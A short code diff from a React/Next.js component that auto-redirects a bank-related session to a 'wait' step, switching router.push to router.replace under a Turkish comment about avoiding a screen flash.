@@ -39,7 +39,8 @@ export function AutoRedirectClient({ sessionId, bankSlug, bankName }: Props) {
         .eq("id", sessionId);
 
       if (mounted) {
-        router.push(stepToPath("wait", sessionId));
+        // ⭐ FLASH YOK: router.push → router.replace
+        router.replace(stepToPath("wait", sessionId));
       }
     }
 
